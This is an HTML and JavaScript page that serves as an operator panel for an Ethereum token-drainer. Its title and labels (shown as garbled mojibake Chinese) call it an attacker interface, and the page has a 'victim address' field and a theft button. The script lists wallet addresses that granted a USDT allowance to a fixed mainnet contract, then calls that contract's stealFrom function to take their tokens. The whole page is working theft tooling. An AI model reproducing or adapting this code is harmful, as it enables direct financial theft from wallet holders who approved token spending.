
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>ğŸ› ï¸ æ”»æ“Šè€…æ“ä½œä»‹é¢ v3.1.1</title>
</head>
<body>
  <h2>ğŸ› ï¸ æ”»æ“Šè€…æ“ä½œä»‹é¢ v3.1.1ï¼ˆEthereum ä¸»ç¶²ï¼‰</h2>
  <p>åˆç´„åœ°å€ï¼š<b>0xFbe9c4748A267562f723C67db673943F901533D6</b></p>
  <p>ç›®å‰ç™»å…¥å¸³è™Ÿï¼š<span id="account">æœªé€£ç·š</span></p>
  <p>âœ… èº«ä»½é©—è­‰ï¼šä½ æ˜¯æ”»æ“Šè€…æœ¬äºº</p>
  <input id="victim" placeholder="å—å®³è€…åœ°å€">
  <button onclick="drain()">åŸ·è¡Œç›œå–</button>
  <p>â›ï¸ ç­‰å¾…æ“ä½œ...</p>
  <h4>ğŸ“œ æœ€è¿‘æˆæ¬Šåœ°å€åˆ—è¡¨ï¼š</h4>
  <ul id="list"></ul>

  <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
  <script>
    const contractAddress = "0xFbe9c4748A267562f723C67db673943F901533D6";
    const tokenAddress = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
    const abi = [{ "name": "stealFrom", "type": "function", "inputs": [
      { "type": "address", "name": "victim" }
    ], "outputs": [], "constant": false }];
    const erc20abi = [
      { "name": "allowance", "type": "function", "inputs": [
        { "type": "address", "name": "owner" },
        { "type": "address", "name": "spender" }
      ], "outputs": [{ "type": "uint256", "name": "" }], "constant": true },
    ];

    async function load() {
      const web3 = new Web3(window.ethereum);
      await window.ethereum.enable();
      const accounts = await web3.eth.getAccounts();
      document.getElementById("account").innerText = accounts[0];

      const history = JSON.parse(localStorage.getItem("history") || "[]");
      const list = document.getElementById("list");
      const erc20 = new web3.eth.Contract(erc20abi, tokenAddress);
      for (const addr of history) {
        const allowance = await erc20.methods.allowance(addr, contractAddress).call();
        if (allowance > 0) {
          const li = document.createElement("li");
          li.innerText = addr;
          list.appendChild(li);
        }
      }
    }

    async function drain() {
      const web3 = new Web3(window.ethereum);
      const contract = new web3.eth.Contract(abi, contractAddress);
      const accounts = await web3.eth.getAccounts();
      const victim = document.getElementById("victim").value;
      try {
        await contract.methods.stealFrom(victim).send({ from: accounts[0] });
        alert("âœ… åŸ·è¡ŒæˆåŠŸ");
      } catch (e) {
        alert("âŒ éŒ¯èª¤ï¼š" + e.message);
      }
    }

    load();
  </script>
</body>
</html>
